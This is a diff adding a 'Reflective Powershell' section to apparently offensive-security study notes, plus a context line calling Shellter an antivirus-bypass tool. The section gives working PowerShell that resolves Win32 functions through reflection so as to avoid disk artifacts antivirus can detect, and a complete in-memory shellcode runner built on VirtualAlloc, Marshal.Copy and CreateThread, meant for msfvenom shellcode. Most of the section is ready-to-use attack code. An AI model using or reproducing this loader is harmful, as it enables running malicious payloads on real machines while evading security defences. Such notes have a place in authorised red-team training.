@@ -806,6 +806,101 @@ Then we can package the contents
 </details>
 
 <details>
+<summary> Reflective Powershell </summary>
+
+When attempting to interact with Win32 APIs using powershell, the Add-Type cmdlet is the easiest way to define .NET classes and instatiate objects, however this cmdlet creates artifacts on disk which are detectable by AV. 
+
+Instead, we can find arbitrary Win32 APIs that are already loaded into memory by other assemblies, and interact with them. 
+
+In the below example, we can resolve the Win32 API address and use that to locate the address of MessageBoxA. Then we create the DelegateType and call GetDelegateForFunctionPointer to link the function address and the DelegateType and invoke MessageBox. A simple "Hello World" prompt shows we were successful.
+
+``` powershell
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+$MessageBoxA = LookupFunc user32.dll MessageBoxA
+$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+$Domain = [AppDomain]::CurrentDomain
+$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
+  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
+  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
+  'RTSpecialName, HideBySig, Public', 
+    [System.Reflection.CallingConventions]::Standard, 
+      @([IntPtr], [String], [String], [int]))
+$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
+  'Public, HideBySig, NewSlot, Virtual', 
+    [int], 
+      @([IntPtr], [String], [String], [int]))
+$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
+$MyDelegateType = $MyTypeBuilder.CreateType()
+
+$MyFunction = [System.Runtime.InteropServices.Marshal]::
+    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
+$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
+```
+
+We can also create a shellcode runner as seen below. Note that for this shellcode, we want to generate the shellcode in ps1 format (in this case using msfvenom).
+
+``` powershell
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
+$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
+$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+
+</details>
+
+<details>
 <summary> shellter </summary>
 
 Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software.
